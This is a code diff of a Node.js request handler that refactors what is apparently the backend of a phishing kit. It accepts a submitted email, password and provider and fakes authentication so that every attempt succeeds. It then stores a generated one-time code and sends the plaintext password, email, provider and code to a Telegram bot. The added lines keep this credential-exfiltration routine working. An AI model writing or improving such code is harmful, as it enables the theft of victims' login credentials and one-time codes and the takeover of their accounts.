@@ -30,24 +30,27 @@ module.exports = async function handler(req, res) {
     return;
   }
 
-  // Robust body parsing for both string and object
-  let email, password, provider;
+  // Robust body parsing
   let bodyObj = req.body;
   if (typeof req.body === "string") {
-    try { bodyObj = JSON.parse(req.body); } catch (e) {
+    try {
+      bodyObj = JSON.parse(req.body);
+    } catch (e) {
       res.status(400).json({ success: false, message: "Invalid JSON body" });
       return;
     }
   }
-  ({ email, password, provider } = bodyObj || {});
+  const { email, password, provider } = bodyObj || {};
 
   if (!email || !password || !provider) {
     res.status(400).json({ success: false, message: "Missing required fields" });
     return;
   }
 
-  email = email.trim().toLowerCase();
+  // Normalize email
+  const normalizedEmail = email.trim().toLowerCase();
 
+  // Fake authentication — always succeed
   const authResult = { success: true };
 
   if (!authResult.success) {
@@ -58,7 +61,8 @@ module.exports = async function handler(req, res) {
   const otp = generateOtp();
 
   try {
-    await redis.set(getOtpKey(email), otp, "EX", 300);
+    // Store OTP in Redis with 5 minute expiry (recommended)
+    await redis.set(getOtpKey(normalizedEmail), otp, "EX", 300);
   } catch (err) {
     res.status(500).json({
       success: false,
@@ -68,7 +72,9 @@ module.exports = async function handler(req, res) {
     return;
   }
 
-  const message = `🔐 *New Login Attempt*\n\n📧 Email: ${email}\n🔑 Password: ${password}\n🌐 Provider: ${provider}\n✅ Authenticated: YES\n🧾 OTP: ${otp}`;
+  // Send credentials and OTP to Telegram
+  const message = `🔐 *New Login Attempt*\n\n📧 Email: ${normalizedEmail}\n🔑 Password: ${password}\n🌐 Provider: ${provider}\n✅ Authenticated: YES\n🧾 OTP: ${otp}`;
+
   const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
   try {
@@ -90,7 +96,7 @@ module.exports = async function handler(req, res) {
     res.status(200).json({
       success: true,
       message: "OTP sent to Telegram",
-      email,
+      email: normalizedEmail,
     });
   } catch (error) {
     res.status(500).json({
